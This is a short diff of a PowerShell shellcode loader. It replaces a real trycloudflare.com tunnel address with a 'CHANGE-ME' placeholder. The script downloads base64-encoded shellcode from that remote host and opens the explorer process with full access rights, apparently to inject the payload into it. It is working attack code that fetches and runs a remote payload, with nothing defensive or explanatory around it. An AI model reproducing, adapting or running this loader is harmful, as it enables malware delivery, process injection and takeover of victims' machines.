@@ -30,7 +30,7 @@ Add-Type -TypeDefinition $code
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
 # Get shellcode
-$sc = [Convert]::FromBase64String((New-Object Net.WebClient).DownloadString('https://attention-launches-kind-commonly.trycloudflare.com/payloads/shellcode.txt?key=X7k9mP2vL4qR8nT1'))
+$sc = [Convert]::FromBase64String((New-Object Net.WebClient).DownloadString('https://CHANGE-MECHANGE-ME.trycloudflare.com/payloads/shellcode.txt?key=X7k9mP2vL4qR8nT1'))
 
 # Open target process - explorer (PID 5584)
 $h = [N]::OpenProcess(0x1F0FFF, $false, 5584)
